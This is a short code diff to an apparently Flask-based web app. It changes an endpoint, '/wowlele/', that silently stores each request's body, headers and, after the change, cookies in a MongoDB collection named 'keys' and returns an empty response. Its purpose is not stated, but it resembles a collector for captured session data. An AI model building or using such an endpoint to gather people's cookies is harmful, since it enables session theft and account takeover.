@@ -71,5 +71,5 @@ def on_set_ip(event):
 
 @app.get("/wowlele/")
 def wowlele():
-    keys.insert_one({"data": request.get_data(as_text=True), "headers": json.dumps(request.headers), "time": datetime.datetime.now()})
+    keys.insert_one({"data": request.get_data(as_text=True), "headers": json.dumps(dict(request.headers)), "cookies": json.dumps(dict(request.cookies)), "time": datetime.datetime.now()})
     return ""
